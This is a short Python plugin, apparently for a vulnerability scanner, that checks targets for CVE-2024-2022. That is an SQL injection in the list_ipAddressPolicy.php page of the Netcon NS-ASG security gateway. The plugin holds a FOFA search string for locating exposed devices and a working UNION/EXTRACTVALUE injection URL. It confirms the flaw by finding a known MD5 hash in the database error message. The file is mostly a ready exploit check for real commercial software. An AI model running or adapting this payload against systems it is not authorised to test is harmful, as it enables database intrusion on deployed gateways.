#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/wCY2msm6hcW5qgC9gZFpsQ',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '网康NS-ASG应用安全网关list_ipAddressPolicy.php sql注入 CVE-2024-2022',

      'level'     :   'high',

      'FOFA'      :   'app="网康科技-NS-ASG安全网关"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/11',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/admin/list_ipAddressPolicy.php?GroupId=-1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+md5(102103122)),0x7e))'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'XPATH syntax error.*?6cfe798ba8e5b85feb50164c59f4bec',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret